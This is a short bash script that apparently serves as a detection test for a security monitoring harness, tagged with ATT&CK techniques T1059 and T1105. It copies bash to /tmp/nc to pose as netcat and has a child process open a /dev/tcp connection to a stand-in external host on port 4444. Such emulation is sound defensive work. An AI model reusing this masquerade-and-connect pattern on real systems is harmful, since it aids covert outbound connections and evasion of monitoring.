#!/usr/bin/env bash
# T1059+T1105 (Tier B) — a suspicious PARENT (bash-as-/tmp/nc, a lolbin in /tmp)
# forks a BENIGN child (a plain bash) that does the connect. Historically a
# pid-join-only miss; P0-1 shipped ancestry inheritance, so this may now fire
# `suspicious_ancestor` on the 9002 → scored GAP_CLOSED (the harness reports the
# improvement). The parent must outlive the child so /proc resolves both.
set -eu
host="${SINK_EXTERNAL:-203.0.113.10}"
port="${SINK_PORT:-4444}"
cp -f "$(command -v bash)" /tmp/nc && chmod +x /tmp/nc
timeout 6 /tmp/nc -c "bash -c \"timeout 3 bash -c 'exec 3<>/dev/tcp/${host}/${port}' 2>/dev/null\"; sleep 1" 2>/dev/null || true
